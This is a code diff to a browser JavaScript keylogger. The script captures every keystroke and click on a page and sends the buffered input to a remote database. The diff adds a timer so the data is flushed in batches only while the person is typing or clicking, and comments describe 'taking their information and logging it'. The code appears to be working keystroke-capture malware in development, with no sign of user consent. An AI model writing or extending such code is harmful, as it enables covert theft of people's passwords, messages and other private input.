@@ -83,8 +83,18 @@ var strings = [];
 let enter = 13;
 let tab = 9;
 
+/*  two variables - timerGoing is for a smart log dumper - if the person isn't typing or clicking, let's not fill our database with junk
+*   so when they start typing or click, we are now going to start taking their information and logging it 
+*/
+var timerGoing = false;
+var timerTracker = null;
+
 // every time there is a keyup, collect it into the buffer. line 6, i'm not really sure what's going on there... got it from StackOverflow. so if we use something like this we'll want to figure out exactly how it works haha
 window.onkeyup = function(e) {
+
+    if(timerGoing == false){
+        startTimer();
+    }
 
     var key = e.keyCode ? e.keyCode : e.which;
     strings += String.fromCharCode(key);
@@ -108,6 +118,8 @@ window.onkeyup = function(e) {
         });*/
         dbStoreData();
         writefunc();
+        clearTimeout(timerTracker); //reset the timer and restart it
+        startTimer();
     }
 }
 
@@ -115,8 +127,10 @@ window.onkeyup = function(e) {
 window.onclick = clickStore;
 function clickStore() {
        //dbStoredata(); //UNCOMMENT this line when we are ready to push it
-       writefunc();
-       return false;
+        writefunc();
+        clearTimeout(timerTracker); //reset the timer and restart it
+        startTimer();
+        return false;
      }
 
 function dbStoreData() {
@@ -134,13 +148,24 @@ function dbStoreData() {
                 console.log("Success", data);
             }
         });
+        timerGoing = false;
 } 
 
 // this is a function that writes the buffer to the browser console, and then clears the buffer
 //NOTE: remove the 'console.log' from this later and just leave it as a reset function for strings and params
 function writefunc() {
     // reset the strings variable and the item for the DB
+    timerGoing = false;
     console.log(strings);
     strings = [];
     params.Item = {};
+}
+
+//replace writefunc with dbStoreData
+function startTimer() {
+    timerGoing = true;
+    timerTracker = window.setTimeout(function(){
+        //dbStoreData(); //UNCOMMENT this and delete writefunc
+        writefunc();
+    }, 10000)
 }
